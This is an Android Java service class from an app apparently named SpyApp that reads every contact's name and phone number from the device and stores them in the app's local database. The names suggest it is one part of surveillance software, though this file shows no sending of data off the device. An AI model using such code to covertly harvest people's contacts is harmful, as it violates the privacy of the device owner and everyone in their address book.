package com.app.spyapp.service;

import android.app.IntentService;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.res.AssetFileDescriptor;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.provider.ContactsContract;
import android.text.TextUtils;
import android.util.Log;

import com.app.spyapp.SpyApp;
import com.app.spyapp.common.Utils;
import com.app.spyapp.model.ContactModel;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.util.ArrayList;


public class ContactService extends IntentService {
    private SpyApp spyApp;

    public ContactService() {
        super(ContactService.class.getSimpleName());
    }


    // get contactBackup

    private ArrayList<ContactModel> getContactList() {
        ArrayList<ContactModel> contactList = new ArrayList<>();
        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if (cur.getCount() > 0) {
            while (cur.moveToNext()) {
                ContactModel contactModel = new ContactModel();
                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.DISPLAY_NAME));
                contactModel.setContactId(id);
                contactModel.setName(name);
                if (Integer.parseInt(cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));
                        contactModel.setNumber(phoneNo);
                    }
                    pCur.close();
                }
                contactList.add(contactModel);
            }
        }
        return contactList;
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        spyApp = (SpyApp) getApplicationContext();
        Utils.showStatus(this, "CONTACT SERVICE");
        Log.i("Debug", "onHandleIntent: CONTACT SERVICE");
        ArrayList<ContactModel> contactList = getContactList();
        if (contactList != null && contactList.size() > 0) {
            for (int i = 0; i < contactList.size(); i++) {
                if (!TextUtils.isEmpty(contactList.get(i).getNumber())) {
                    spyApp.getDatabaseHelper().insertContact(contactList.get(i));
                }
            }
        }
    }
}
